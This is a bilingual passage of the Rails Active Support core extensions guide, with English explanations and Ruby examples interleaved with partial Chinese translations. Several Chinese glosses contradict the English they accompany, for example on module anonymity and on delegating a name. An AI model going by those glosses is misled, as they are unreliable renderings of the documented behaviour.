A module may or may not have a name:  模块可以有名称，也可以没有名称。
module M
end
M.name # => "M"
 
N = Module.new
N.name # => "N"
 
Module.new.name # => nil

You can check whether a module has a name with the predicate anonymous?:                anonymous?方法可以测试一个模块有无名称：
module M
end
M.anonymous? # => false
 
Module.new.anonymous? # => true

Note that being unreachable does not imply being anonymous:    注意不可达的模块没有匿名性。
module M
end
 
m = Object.send(:remove_const, :M)
 
m.reachable? # => false
m.anonymous? # => false

though an anonymous module is unreachable by definition.  但一个匿名模块可以定义为不可达的。

定义于 active_support/core_ext/module/anonymous.rb.
###  3.7 Method Delegation  方法委托

The macro delegate offers an easy way to forward methods.                                                          宏委托提供了一个简便的方法来转发方法。

Let's imagine that users in some application have login information in the User model but name and other data in a separate Profile model:     试想一下程序里的用户在User模型中有一些登录的信息，但名称和其他信息在另一个Profile模型里：
class User < ActiveRecord::Base
  has_one :profile
end

With that configuration you get a user's name via their profile, user.profile.name, but it could be handy to still be able to access such attribute directly:                                                                      根据配置，你可以通过用户的profile（user.profile.name）获得一个用户的名称，但不能直接对名称进行赋值。
class User < ActiveRecord::Base
  has_one :profile
 
  def name
    profile.name
  end
end

That is what delegate does for you:                这就是delegate委托发挥作用的地方了：
class User < ActiveRecord::Base
  has_one :profile
 
  delegate :name, to: :profile
end

It is shorter, and the intention more obvious.   委托让代码更简短，意图也更明显。

The method must be public in the target.       目标方法必须是公共的。

The delegate macro accepts several methods:    委托宏可接受一些方法。
delegate :name, :age, :address, :twitter, to: :profile

When interpolated into a string, the :to option should become an expression that evaluates to the object the method is delegated to. Typically a string or symbol. Such an expression is evaluated in the context of the receiver:  插入一个字符串时，:to选项会变成一个表达式，其值传给方法所委托的对象。 典型的是字符串或符号。这样的表达式将在接收者的环境下进行求值。
# delegates to the Rails constant
delegate :logger, to: :Rails
 
# delegates to the receiver's class
delegate :table_name, to: :class

If the :prefix option is true this is less generic, see below.

如果 :prefix 选项为真，则比较少见，详见下面。

By default, if the delegation raises NoMethodError and the target is nil the exception is propagated. You can ask that nil is returned instead with the :allow_nil option:  默认情况下，如果委托抛出一个NoMethodError，并且目标为nil，则异常抛出。可以加上:allow_nil选项，要求返回nil，而不是异常。
delegate :name, to: :profile, allow_nil: true

With :allow_nil the call user.name returns nil if the user has no profile.    加上了:allow_nil，调用user.name，这是用户如果没有profile，则返回nil。

The option :prefix adds a prefix to the name of the generated method. This may be handy for example to get a better name:   :prefix选项会给生成的方法加上前缀。这可以手动给例子取一个更好的名称。
delegate :street, to: :address, prefix: true

The previous example generates address_street rather than street.   前一个例子将生成address_street的名称，而不是street。

Since in this case the name of the generated method is composed of the target object and target method names, the :to option must be a method name.    因为这个例子中所生成的方法的名称混合了目标对象的名称和目标方法的名称，:to选项必须是一个方法名。

A custom prefix may also be configured:             也可以自定义一个前缀。
delegate :size, to: :attachment, prefix: :avatar

In the previous example the macro generates avatar_size rather than size.        在前例中，宏生成avatar_size，不是size。 

定义于 active_support/core_ext/module/delegation.rb

###  3.8 Redefining Methods  重定义方法

There are cases where you need to define a method with define_method, but don't know whether a method with that name already exists. If it does, a warning is issued if they are enabled. No big deal, but not clean either.    有些情况你需要使用define_method定义一个方法，却不知道该方法的名称是否已经存在。如果该名称已经存在，将发出一个警告，如果可以发出的话。这问题不大，却令人生烦。

The method redefine_method prevents such a potential warning, removing the existing method before if needed.   redefine_method会阻止这样的潜在警告，在需要之前移除了整个存在的方法。

定义于 active_support/core_ext/module/remove_method.rb

##  4 Extensions to Class 对Class的扩展
###  4.1 Class Attributes  Class属性
####  4.1.1 class_attribute

The method class_attribute declares one or more inheritable class attributes that can be overridden at any level down the hierarchy.   class_attribute方法声明一个或多个继承的类属性，这些属性在所继承的子类中可以被改写。
class A
  class_attribute :x
end
 
class B < A; end
 
class C < B; end
 
A.x = :a
B.x # => :a
C.x # => :a
 
B.x = :b
A.x # => :a
C.x # => :b
 
C.x = :c
A.x # => :a
B.x # => :b

For example ActionMailer::Base defines:  比如ActionMaile::Base定义的：
class_attribute :default_params
self.default_params = {
  mime_version: "1.0",
  charset: "UTF-8",
  content_type: "text/plain",
  parts_order: [ "text/plain", "text/enriched", "text/html" ]
}.freeze

They can be also accessed and overridden at the instance level.  在其实例级别的代码里可以访问并被改写。
A.x = 1
 
a1 = A.new
a2 = A.new
a2.x = 2
 
a1.x # => 1, comes from A
a2.x # => 2, overridden in a2

The generation of the writer instance method can be prevented by setting the option :instance_writer to false.
module ActiveRecord
  class Base
    class_attribute :table_name_prefix, instance_writer: false
    self.table_name_prefix = ""
  end
end

A model may find that option useful as a way to prevent mass-assignment from setting the attribute.

The generation of the reader instance method can be prevented by setting the option :instance_reader to false.
class A
  class_attribute :x, instance_reader: false
end
 
A.new.x = 1 # NoMethodError

For convenience class_attribute also defines an instance predicate which is the double negation of what the instance reader returns. In the examples above it would be called x?.

When :instance_reader is false, the instance predicate returns a NoMethodError just like the reader method.

If you do not want the instance predicate, pass instance_predicate: false and it will not be defined.

定义于 active_support/core_ext/class/attribute.rb
####  4.1.2 cattr_reader, cattr_writer, and cattr_accessor

The macros cattr_reader, cattr_writer, and cattr_accessor are analogous to their attr_* counterparts but for classes. They initialize a class variable to nil unless it already exists, and generate the corresponding class methods to access it:
class MysqlAdapter < AbstractAdapter
  # Generates class methods to access @@emulate_booleans.
  cattr_accessor :emulate_booleans
  self.emulate_booleans = true
end

Instance methods are created as well for convenience, they are just proxies to the class attribute. So, instances can change the class attribute, but cannot override it as it happens with class_attribute (see above). For example given
module ActionView
  class Base
    cattr_accessor :field_error_proc
    @@field_error_proc = Proc.new{ ... }
  end
end

we can access field_error_proc in views.

Also, you can pass a block to cattr_* to set up the attribute with a default value:
class MysqlAdapter < AbstractAdapter
  # Generates class methods to access @@emulate_booleans with default value of true.
  cattr_accessor(:emulate_booleans) { true }
end

The generation of the reader instance method can be prevented by setting :instance_reader to false and the generation of the writer instance method can be prevented by setting :instance_writer to false. Generation of both methods can be prevented by setting :instance_accessor to false. In all cases, the value must be exactly false and not any false value.
module A
  class B
    # No first_name instance reader is generated.
    cattr_accessor :first_name, instance_reader: false
    # No last_name= instance writer is generated.
    cattr_accessor :last_name, instance_writer: false
    # No surname instance reader or surname= writer is generated.
    cattr_accessor :surname, instance_accessor: false
  end
end

A model may find it useful to set :instance_accessor to false as a way to prevent mass-assignment from setting the attribute.

定义于 active_support/core_ext/module/attribute_accessors.rb.

###  4.2 Subclasses & Descendants    子类和后代
####  4.2.1 subclasses

The subclasses method returns the subclasses of the receiver:
class C; end
C.subclasses # => []
 
class B < C; end
C.subclasses # => [B]
 
class A < B; end
C.subclasses # => [B]
 
class D < C; end
C.subclasses # => [B, D]

The order in which these classes are returned is unspecified.

定义于 active_support/core_ext/class/subclasses.rb.
####  4.2.2 descendants

The descendants method returns all classes that are < than its receiver:
class C; end
C.descendants # => []
 
class B < C; end
C.descendants # => [B]
 
class A < B; end
C.descendants # => [B, A]
 
class D < C; end
C.descendants # => [B, A, D]

The order in which these classes are returned is unspecified.

定义于 active_support/core_ext/class/subclasses.rb.

##  5 Extensions to String 对字符串的扩展
###  5.1 Output Safety    输出安全
####  5.1.1 Motivation  目的

Inserting data into HTML templates needs extra care. For example, you can't just interpolate @review.title verbatim into an HTML page. For one thing, if the review title is "Flanagan & Matz rules!" the output won't be well-formed because an ampersand has to be escaped as "&amp;". What's more, depending on the application, that may be a big security hole because users can inject malicious HTML setting a hand-crafted review title. Check out the section about cross-site scripting in the Security guide for further information about the risks.
####  5.1.2 Safe Strings  安全字符串

Active Support has the concept of (html) safe strings. A safe string is one that is marked as being insertable into HTML as is. It is trusted, no matter whether it has been escaped or not.

Strings are considered to be unsafe by default:
"".html_safe? # => false

You can obtain a safe string from a given one with the html_safe method:
s = "".html_safe
s.html_safe? # => true

It is important to understand that html_safe performs no escaping whatsoever, it is just an assertion:
s = "<script>...</script>".html_safe
s.html_safe? # => true
s            # => "<script>...</script>"

It is your responsibility to ensure calling html_safe on a particular string is fine.

If you append onto a safe string, either in-place with concat/<<, or with +, the result is a safe string. Unsafe arguments are escaped:
"".html_safe + "<" # => "&lt;"

Safe arguments are directly appended:
"".html_safe + "<".html_safe # => "<"

These methods should not be used in ordinary views. Unsafe values are automatically escaped:
<%= @review.title %> <%# fine, escaped if needed %>

To insert something verbatim use the raw helper rather than calling html_safe:
<%= raw @cms.current_template %> <%# inserts @cms.current_template as is %>

or, equivalently, use <%==:
<%== @cms.current_template %> <%# inserts @cms.current_template as is %>

The raw helper calls html_safe for you:
def raw(stringish)
  stringish.to_s.html_safe
end

定义于 active_support/core_ext/string/output_safety.rb.
####  5.1.3 Transformation  转换

As a rule of thumb, except perhaps for concatenation as explained above, any method that may change a string gives you an unsafe string. These are downcase, gsub, strip, chomp, underscore, etc.

In the case of in-place transformations like gsub! the receiver itself becomes unsafe.

The safety bit is lost always, no matter whether the transformation actually changed something.
####  5.1.4 Conversion and Coercion  转变和强制

Calling to_s on a safe string returns a safe string, but coercion with to_str returns an unsafe string.
####  5.1.5 Copying  复制

Calling dup or clone on safe strings yields safe strings.

###  5.2 remove 移除

The method remove will remove all occurrences of the pattern:
"Hello World".remove(/Hello /) => "World"

There's also the destructive version String#remove!.

定义于 active_support/core_ext/string/filters.rb.
###  5.3 squish 挤压

The method squish strips leading and trailing whitespace, and substitutes runs of whitespace with a single space each:
" \n  foo\n\r \t bar \n".squish # => "foo bar"

There's also the destructive version String#squish!.

Note that it handles both ASCII and Unicode whitespace like mongolian vowel separator (U+180E).

定义于 active_support/core_ext/string/filters.rb.
###  5.4 truncate 截断

The method truncate returns a copy of its receiver truncated after a given length:
"Oh dear! Oh dear! I shall be late!".truncate(20)
# => "Oh dear! Oh dear!..."

Ellipsis can be customized with the :omission option:
"Oh dear! Oh dear! I shall be late!".truncate(20, omission: '&hellip;')
# => "Oh dear! Oh &hellip;"

Note in particular that truncation takes into account the length of the omission string.

Pass a :separator to truncate the string at a natural break:
"Oh dear! Oh dear! I shall be late!".truncate(18)
# => "Oh dear! Oh dea..."
"Oh dear! Oh dear! I shall be late!".truncate(18, separator: ' ')
# => "Oh dear! Oh..."

The option :separator can be a regexp:
"Oh dear! Oh dear! I shall be late!".truncate(18, separator: /\s/)
# => "Oh dear! Oh..."

In above examples "dear" gets cut first, but then :separator prevents it.

定义于 active_support/core_ext/string/filters.rb.

###  5.5 inquiry 质询

The inquiry method converts a string into a StringInquirer object making equality checks prettier.
"production".inquiry.production? # => true
"active".inquiry.inactive?       # => false
###  5.6 starts_with? and ends_with? 开始于和结束于

Active Support defines 3rd person aliases of String#start_with? and String#end_with?:
"foo".starts_with?("f") # => true
"foo".ends_with?("o")   # => true

定义于 active_support/core_ext/string/starts_ends_with.rb.
###  5.7 strip_heredoc 缩排文档

The method strip_heredoc strips indentation in heredocs.

For example in
if options[:usage]
  puts <<-USAGE.strip_heredoc
    This command does such and such.
 
    Supported options are:
      -h         This message
      ...
  USAGE
end

the user would see the usage message aligned against the left margin.

Technically, it looks for the least indented line in the whole string, and removes that amount of leading whitespace.

定义于 active_support/core_ext/string/strip.rb.
###  5.8 indent 缩进

Indents the lines in the receiver:
<<EOS.indent(2)
def some_method
  some_code
end
EOS
# =>
  def some_method
    some_code
  end

The second argument, indent_string, specifies which indent string to use. The default is nil, which tells the method to make an educated guess peeking at the first indented line, and fallback to a space if there is none.
"  foo".indent(2)        # => "    foo"
"foo\n\t\tbar".indent(2) # => "\t\tfoo\n\t\t\t\tbar"
"foo".indent(2, "\t")    # => "\t\tfoo"

While indent_string is typically one space or tab, it may be any string.

The third argument, indent_empty_lines, is a flag that says whether empty lines should be indented. Default is false.
"foo\n\nbar".indent(2)            # => "  foo\n\n  bar"
"foo\n\nbar".indent(2, nil, true) # => "  foo\n  \n  bar"

The indent! method performs indentation in-place.

定义于 active_support/core_ext/string/indent.rb.
###  5.9 Access  访问
####  5.9.1 at(position) 指定位置

Returns the character of the string at position position:
"hello".at(0)  # => "h"
"hello".at(4)  # => "o"
"hello".at(-1) # => "o"
"hello".at(10) # => nil

定义于 active_support/core_ext/string/access.rb.
####  5.9.2 from(position) 从指定位置开始

Returns the substring of the string starting at position position:
"hello".from(0)  # => "hello"
"hello".from(2)  # => "llo"
"hello".from(-2) # => "lo"
"hello".from(10) # => "" if < 1.9, nil in 1.9

定义于 active_support/core_ext/string/access.rb.
####  5.9.3 to(position) 指定结束位置

Returns the substring of the string up to position position:
"hello".to(0)  # => "h"
"hello".to(2)  # => "hel"
"hello".to(-2) # => "hell"
"hello".to(10) # => "hello"

定义于 active_support/core_ext/string/access.rb.
####  5.9.4 first(limit = 1) 第一个字符

The call str.first(n) is equivalent to str.to(n-1) if n > 0, and returns an empty string for n == 0.

定义于 active_support/core_ext/string/access.rb.
####  5.9.5 last(limit = 1) 最后一个字符

The call str.last(n) is equivalent to str.from(-n) if n > 0, and returns an empty string for n == 0.

定义于 active_support/core_ext/string/access.rb.

###  5.10 Inflections   反射
####  5.10.1 pluralize 复数化

The method pluralize returns the plural of its receiver:
"table".pluralize     # => "tables"
"ruby".pluralize      # => "rubies"
"equipment".pluralize # => "equipment"

As the previous example shows, Active Support knows some irregular plurals and uncountable nouns. Built-in rules can be extended in config/initializers/inflections.rb. That file is generated by the rails command and has instructions in comments.

pluralize can also take an optional count parameter. If count == 1 the singular form will be returned. For any other value of count the plural form will be returned:
"dude".pluralize(0) # => "dudes"
"dude".pluralize(1) # => "dude"
"dude".pluralize(2) # => "dudes"

Active Record uses this method to compute the default table name that corresponds to a model:
# active_record/model_schema.rb
def undecorated_table_name(class_name = base_class.name)
  table_name = class_name.to_s.demodulize.underscore
  pluralize_table_names ? table_name.pluralize : table_name
end

定义于 active_support/core_ext/string/inflections.rb.
####  5.10.2 singularize 单数化

The inverse of pluralize:
"tables".singularize    # => "table"
"rubies".singularize    # => "ruby"
"equipment".singularize # => "equipment"

Associations compute the name of the corresponding default associated class using this method:
# active_record/reflection.rb
def derive_class_name
  class_name = name.to_s.camelize
  class_name = class_name.singularize if collection?
  class_name
end

定义于 active_support/core_ext/string/inflections.rb.
####  5.10.3 camelize 骆驼命名化

The method camelize returns its receiver in camel case:
"product".camelize    # => "Product"
"admin_user".camelize # => "AdminUser"

As a rule of thumb you can think of this method as the one that transforms paths into Ruby class or module names, where slashes separate namespaces:
"backoffice/session".camelize # => "Backoffice::Session"

For example, Action Pack uses this method to load the class that provides a certain session store:
# action_controller/metal/session_management.rb
def session_store=(store)
  @@session_store = store.is_a?(Symbol) ?
    ActionDispatch::Session.const_get(store.to_s.camelize) :
    store
end

camelize accepts an optional argument, it can be :upper (default), or :lower. With the latter the first letter becomes lowercase:
"visual_effect".camelize(:lower) # => "visualEffect"

That may be handy to compute method names in a language that follows that convention, for example JavaScript.

As a rule of thumb you can think of camelize as the inverse of underscore, though there are cases where that does not hold: "SSLError".underscore.camelize gives back "SslError". To support cases such as this, Active Support allows you to specify acronyms in config/initializers/inflections.rb:
ActiveSupport::Inflector.inflections do |inflect|
  inflect.acronym 'SSL'
end
 
"SSLError".underscore.camelize # => "SSLError"

camelize is aliased to camelcase.

定义于 active_support/core_ext/string/inflections.rb.
####  5.10.4 underscore 下划线分割

The method underscore goes the other way around, from camel case to paths:
"Product".underscore   # => "product"
"AdminUser".underscore # => "admin_user"

Also converts "::" back to "/":
"Backoffice::Session".underscore # => "backoffice/session"

and understands strings that start with lowercase:
"visualEffect".underscore # => "visual_effect"

underscore accepts no argument though.

Rails class and module autoloading uses underscore to infer the relative path without extension of a file that would define a given missing constant:
# active_support/dependencies.rb
def load_missing_constant(from_mod, const_name)
  ...
  qualified_name = qualified_name_for from_mod, const_name
  path_suffix = qualified_name.underscore
  ...
end

As a rule of thumb you can think of underscore as the inverse of camelize, though there are cases where that does not hold. For example, "SSLError".underscore.camelize gives back "SslError".

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.5 titleize 标题化（首字母大写）

The method titleize capitalizes the words in the receiver:
"alice in wonderland".titleize # => "Alice In Wonderland"
"fermat's enigma".titleize     # => "Fermat's Enigma"

titleize is aliased to titlecase.

定义于 active_support/core_ext/string/inflections.rb.
####  5.10.6 dasherize 转为连线分割

The method dasherize replaces the underscores in the receiver with dashes:
"name".dasherize         # => "name"
"contact_data".dasherize # => "contact-data"

The XML serializer of models uses this method to dasherize node names:
# active_model/serializers/xml.rb
def reformat_name(name)
  name = name.camelize if camelize?
  dasherize? ? name.dasherize : name
end

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.7 demodulize 常量最右端字符串

Given a string with a qualified constant name, demodulize returns the very constant name, that is, the rightmost part of it:
"Product".demodulize                        # => "Product"
"Backoffice::UsersController".demodulize    # => "UsersController"
"Admin::Hotel::ReservationUtils".demodulize # => "ReservationUtils"
"::Inflections".demodulize                  # => "Inflections"
"".demodulize                               # => ""

Active Record for example uses this method to compute the name of a counter cache column:
# active_record/reflection.rb
def counter_cache_column
  if options[:counter_cache] == true
    "#{active_record.name.demodulize.underscore.pluralize}_count"
  elsif options[:counter_cache]
    options[:counter_cache]
  end
end

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.8  Deconstantize 转为常量上级

Given a string with a qualified constant reference expression, deconstantize removes the rightmost segment, generally leaving the name of the constant's container:
"Product".deconstantize                        # => ""
"Backoffice::UsersController".deconstantize    # => "Backoffice"
"Admin::Hotel::ReservationUtils".deconstantize # => "Admin::Hotel"

Active Support for example uses this method in Module#qualified_const_set:
def qualified_const_set(path, value)
  QualifiedConstUtils.raise_if_absolute(path)
 
  const_name = path.demodulize
  mod_name = path.deconstantize
  mod = mod_name.empty? ? self : qualified_const_get(mod_name)
  mod.const_set(const_name, value)
end

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.9 parameterize 转为网络地址参数名称

The method parameterize normalizes its receiver in a way that can be used in pretty URLs.
"John Smith".parameterize # => "john-smith"
"Kurt Gödel".parameterize # => "kurt-godel"

In fact, the result string is wrapped in an instance of ActiveSupport::Multibyte::Chars.

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.10 tableize 转为数据表名称

The method tableize is underscore followed by pluralize.
"Person".tableize      # => "people"
"Invoice".tableize     # => "invoices"
"InvoiceLine".tableize # => "invoice_lines"

As a rule of thumb, tableize returns the table name that corresponds to a given model for simple cases. The actual implementation in Active Record is not straight tableize indeed, because it also demodulizes the class name and checks a few options that may affect the returned string.

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.11 classify 类名单数

The method classify is the inverse of tableize. It gives you the class name corresponding to a table name:
"people".classify        # => "Person"
"invoices".classify      # => "Invoice"
"invoice_lines".classify # => "InvoiceLine"

The method understands qualified table names:
"highrise_production.companies".classify # => "Company"

Note that classify returns a class name as a string. You can get the actual class object invoking constantize on it, explained next.

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.12 constantize 常量化

The method constantize resolves the constant reference expression in its receiver:
"Fixnum".constantize # => Fixnum
 
module M
  X = 1
end
"M::X".constantize # => 1

If the string evaluates to no known constant, or its content is not even a valid constant name, constantize raises NameError.

Constant name resolution by constantize starts always at the top-level Object even if there is no leading "::".
X = :in_Object
module M
  X = :in_M
 
  X                 # => :in_M
  "::X".constantize # => :in_Object
  "X".constantize   # => :in_Object (!)
end

So, it is in general not equivalent to what Ruby would do in the same spot, had a real constant be evaluated.

Mailer test cases obtain the mailer being tested from the name of the test class using constantize:
# action_mailer/test_case.rb
def determine_default_mailer(name)
  name.sub(/Test$/, '').constantize
rescue NameError => e
  raise NonInferrableMailerError.new(name)
end

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.13 humanize 易读化

The method humanize tweaks an attribute name for display to end users.

Specifically performs these transformations:

    Applies human inflection rules to the argument.
    Deletes leading underscores, if any.
    Removes a "_id" suffix if present.
    Replaces underscores with spaces, if any.
    Downcases all words except acronyms.
    Capitalizes the first word.

The capitalization of the first word can be turned off by setting the +:capitalize+ option to false (default is true).
"name".humanize                         # => "Name"
"author_id".humanize                    # => "Author"
"author_id".humanize(capitalize: false) # => "author"
"comments_count".humanize               # => "Comments count"
"_id".humanize                          # => "Id"

If "SSL" was defined to be an acronym:
'ssl_error'.humanize # => "SSL error"

The helper method full_messages uses humanize as a fallback to include attribute names:
def full_messages
  full_messages = []
 
  each do |attribute, messages|
    ...
    attr_name = attribute.to_s.gsub('.', '_').humanize
    attr_name = @base.class.human_attribute_name(attribute, default: attr_name)
    ...
  end
 
  full_messages
end

定义于 active_support/core_ext/string/inflections.rb.

####  5.10.14 foreign_key 外键化

The method foreign_key gives a foreign key column name from a class name. To do so it demodulizes, underscores, and adds "_id":
"User".foreign_key           # => "user_id"
"InvoiceLine".foreign_key    # => "invoice_line_id"
"Admin::Session".foreign_key # => "session_id"

Pass a false argument if you do not want the underscore in "_id":
"User".foreign_key(false) # => "userid"

Associations use this method to infer foreign keys, for example has_one and has_many do this:
# active_record/associations.rb
foreign_key = options[:foreign_key] || reflection.active_record.name.foreign_key

定义于 active_support/core_ext/string/inflections.rb.

##  5.11 Conversions  类的转换
###  5.11.1 to_date, to_time, to_datetime

The methods to_date, to_time, and to_datetime are basically convenience wrappers around Date._parse:
"2010-07-27".to_date              # => Tue, 27 Jul 2010
"2010-07-27 23:37:00".to_time     # => Tue Jul 27 23:37:00 UTC 2010
"2010-07-27 23:37:00".to_datetime # => Tue, 27 Jul 2010 23:37:00 +0000

to_time receives an optional argument :utc or :local, to indicate which time zone you want the time in:
"2010-07-27 23:42:00".to_time(:utc)   # => Tue Jul 27 23:42:00 UTC 2010
"2010-07-27 23:42:00".to_time(:local) # => Tue Jul 27 23:42:00 +0200 2010

Default is :utc.

Please refer to the documentation of Date._parse for further details.

The three of them return nil for blank receivers.

定义于 active_support/core_ext/string/conversions.rb.

##  6 Extensions to Numeric 对数字类的扩展
###  6.1 Bytes  字节

All numbers respond to these methods:    所有的数字都有这些方法
bytes 字节
kilobytes 千字节
megabytes 兆字节（百万）
gigabytes 千兆字节（十亿）
terabytes 万亿字节
petabytes
exabytes

They return the corresponding amount of bytes, using a conversion factor of 1024:                           返回对应数量的字节，使用1024进制
2.kilobytes   # => 2048
3.megabytes   # => 3145728
3.5.gigabytes # => 3758096384
-4.exabytes   # => -4611686018427387904

Singular forms are aliased so you are able to say:   也可用单数形式，所以可以这样写：
1.megabyte # => 1048576

定义于 active_support/core_ext/numeric/bytes.rb.
###  6.2 Time   时间

Enables the use of time calculations and declarations, like 45.minutes + 2.hours + 4.years.

These methods use Time#advance for precise date calculations when using from_now, ago, etc. as well as adding or subtracting their results from a Time object. For example:
# equivalent to Time.current.advance(months: 1)
1.month.from_now
 
# equivalent to Time.current.advance(years: 2)
2.years.from_now
 
# equivalent to Time.current.advance(months: 4, years: 5)
(4.months + 5.years).from_now

While these methods provide precise calculation when used as in the examples above, care should be taken to note that this is not true if the result of months',years', etc is converted before use:
# equivalent to 30.days.to_i.from_now
1.month.to_i.from_now
 
# equivalent to 365.25.days.to_f.from_now
1.year.to_f.from_now

In such cases, Ruby's core Date and Time should be used for precision date and time arithmetic.

定义于 active_support/core_ext/numeric/time.rb.

###  6.3 Formatting  格式

Enables the formatting of numbers in a variety of ways.

Produce a string representation of a number as a telephone number:
5551234.to_s(:phone)
# => 555-1234
1235551234.to_s(:phone)
# => 123-555-1234
1235551234.to_s(:phone, area_code: true)
# => (123) 555-1234
1235551234.to_s(:phone, delimiter: " ")
# => 123 555 1234
1235551234.to_s(:phone, area_code: true, extension: 555)
# => (123) 555-1234 x 555
1235551234.to_s(:phone, country_code: 1)
# => +1-123-555-1234

Produce a string representation of a number as currency:
1234567890.50.to_s(:currency)                 # => $1,234,567,890.50
1234567890.506.to_s(:currency)                # => $1,234,567,890.51
1234567890.506.to_s(:currency, precision: 3)  # => $1,234,567,890.506

Produce a string representation of a number as a percentage:
100.to_s(:percentage)
# => 100.000%
100.to_s(:percentage, precision: 0)
# => 100%
1000.to_s(:percentage, delimiter: '.', separator: ',')
# => 1.000,000%
302.24398923423.to_s(:percentage, precision: 5)
# => 302.24399%

Produce a string representation of a number in delimited form:
12345678.to_s(:delimited)                     # => 12,345,678
12345678.05.to_s(:delimited)                  # => 12,345,678.05
12345678.to_s(:delimited, delimiter: ".")     # => 12.345.678
12345678.to_s(:delimited, delimiter: ",")     # => 12,345,678
12345678.05.to_s(:delimited, separator: " ")  # => 12,345,678 05

Produce a string representation of a number rounded to a precision:
111.2345.to_s(:rounded)                     # => 111.235
111.2345.to_s(:rounded, precision: 2)       # => 111.23
13.to_s(:rounded, precision: 5)             # => 13.00000
389.32314.to_s(:rounded, precision: 0)      # => 389
111.2345.to_s(:rounded, significant: true)  # => 111

Produce a string representation of a number as a human-readable number of bytes:
123.to_s(:human_size)            # => 123 Bytes
1234.to_s(:human_size)           # => 1.21 KB
12345.to_s(:human_size)          # => 12.1 KB
1234567.to_s(:human_size)        # => 1.18 MB
1234567890.to_s(:human_size)     # => 1.15 GB
1234567890123.to_s(:human_size)  # => 1.12 TB

Produce a string representation of a number in human-readable words:
123.to_s(:human)               # => "123"
1234.to_s(:human)              # => "1.23 Thousand"
12345.to_s(:human)             # => "12.3 Thousand"
1234567.to_s(:human)           # => "1.23 Million"
1234567890.to_s(:human)        # => "1.23 Billion"
1234567890123.to_s(:human)     # => "1.23 Trillion"
1234567890123456.to_s(:human)  # => "1.23 Quadrillion"

定义于 active_support/core_ext/numeric/conversions.rb.

##  7 Extensions to Integer 整数类的扩展
###  7.1 multiple_of? 倍数

The method multiple_of? tests whether an integer is multiple of the argument:                           这个方法测试一个整数是否另一个整数的倍数。
2.multiple_of?(1) # => true
1.multiple_of?(2) # => false

定义于 active_support/core_ext/integer/multiple.rb.
###  7.2 ordinal 字符串序数

The method ordinal returns the ordinal suffix string corresponding to the receiver integer:              这个方法返回整数接收者对应的序数字符的后缀。
1.ordinal    # => "st"
2.ordinal    # => "nd"
53.ordinal   # => "rd"
2009.ordinal # => "th"
-21.ordinal  # => "st"
-134.ordinal # => "th"

定义于 active_support/core_ext/integer/inflections.rb.
###  7.3 ordinalize 序数化

The method ordinalize returns the ordinal string corresponding to the receiver integer. In comparison, note that the ordinal method returns only the suffix string.                                       这个方法返回整数接收者对应的序数。注意前面ordinal方法只是返回序数的后缀。
1.ordinalize    # => "1st"
2.ordinalize    # => "2nd"
53.ordinalize   # => "53rd"
2009.ordinalize # => "2009th"
-21.ordinalize  # => "-21st"
-134.ordinalize # => "-134th"

定义于 active_support/core_ext/integer/inflections.rb.

##  8 Extensions to BigDecimal 对大数的扩展
###  8.1 to_s 转为字符串

The method to_s is aliased to to_formatted_s. This provides a convenient way to display a BigDecimal value in floating-point notation:
BigDecimal.new(5.00, 6).to_s  # => "5.0"
###  8.2 to_formatted_s 转为格式化的字符串

Te method to_formatted_s provides a default specifier of "F". This means that a simple call to to_formatted_s or to_s will result in floating point representation instead of engineering notation:
BigDecimal.new(5.00, 6).to_formatted_s  # => "5.0"

and that symbol specifiers are also supported:
BigDecimal.new(5.00, 6).to_formatted_s(:db)  # => "5.0"

Engineering notation is still supported:
BigDecimal.new(5.00, 6).to_formatted_s("e")  # => "0.5E1"
##  9 Extensions to Enumerable 枚举的扩展
###  9.1 sum 合计

The method sum adds the elements of an enumerable:
[1, 2, 3].sum # => 6
(1..100).sum  # => 5050

Addition only assumes the elements respond to +:
[[1, 2], [2, 3], [3, 4]].sum    # => [1, 2, 2, 3, 3, 4]
%w(foo bar baz).sum             # => "foobarbaz"
{a: 1, b: 2, c: 3}.sum # => [:b, 2, :c, 3, :a, 1]

The sum of an empty collection is zero by default, but this is customizable:
[].sum    # => 0
[].sum(1) # => 1

If a block is given, sum becomes an iterator that yields the elements of the collection and sums the returned values:
(1..5).sum {|n| n * 2 } # => 30
[2, 4, 6, 8, 10].sum    # => 30

The sum of an empty receiver can be customized in this form as well:
[].sum(1) {|n| n**3} # => 1

定义于 active_support/core_ext/enumerable.rb.
###  9.2 index_by 按字段重排序列

The method index_by generates a hash with the elements of an enumerable indexed by some key.

It iterates through the collection and passes each element to a block. The element will be keyed by the value returned by the block:
invoices.index_by(&:number)
# => {'2009-032' => <Invoice ...>, '2009-008' => <Invoice ...>, ...}

Keys should normally be unique. If the block returns the same value for different elements no collection is built for that key. The last item will win.

定义于 active_support/core_ext/enumerable.rb.
###  9.3 many? 是否多个

The method many? is shorthand for collection.size > 1:
<% if pages.many? %>
  <%= pagination_links %>
<% end %>

If an optional block is given, many? only takes into account those elements that return true:
@see_more = videos.many? {|video| video.category == params[:category]}

定义于 active_support/core_ext/enumerable.rb.
###  9.4 exclude? 是否不含

The predicate exclude? tests whether a given object does not belong to the collection. It is the negation of the built-in include?:
to_visit << node if visited.exclude?(node)

定义于 active_support/core_ext/enumerable.rb.

##  10 Extensions to Array 对数组的扩展
###  10.1 Accessing  访问

Active Support augments the API of arrays to ease certain ways of accessing them. For example, to returns the subarray of elements up to the one at the passed index:
%w(a b c d).to(2) # => %w(a b c)
[].to(7)          # => []

Similarly, from returns the tail from the element at the passed index to the end. If the index is greater than the length of the array, it returns an empty array.
%w(a b c d).from(2)  # => %w(c d)
%w(a b c d).from(10) # => []
[].from(0)           # => []

The methods second, third, fourth, and fifth return the corresponding element (first is built-in). Thanks to social wisdom and positive constructiveness all around, forty_two is also available.
%w(a b c d).third # => c
%w(a b c d).fifth # => nil

定义于 active_support/core_ext/array/access.rb.

##  10.2 Adding Elements  增加元素
####  10.2.1 prepend 队前插入

This method is an alias of Array#unshift.
%w(a b c d).prepend('e')  # => %w(e a b c d)
[].prepend(10)            # => [10]

定义于 active_support/core_ext/array/prepend_and_append.rb.

####  10.2.2 append 队后追加

This method is an alias of Array#<<.
%w(a b c d).append('e')  # => %w(a b c d e)
[].append([1,2])         # => [[1,2]]

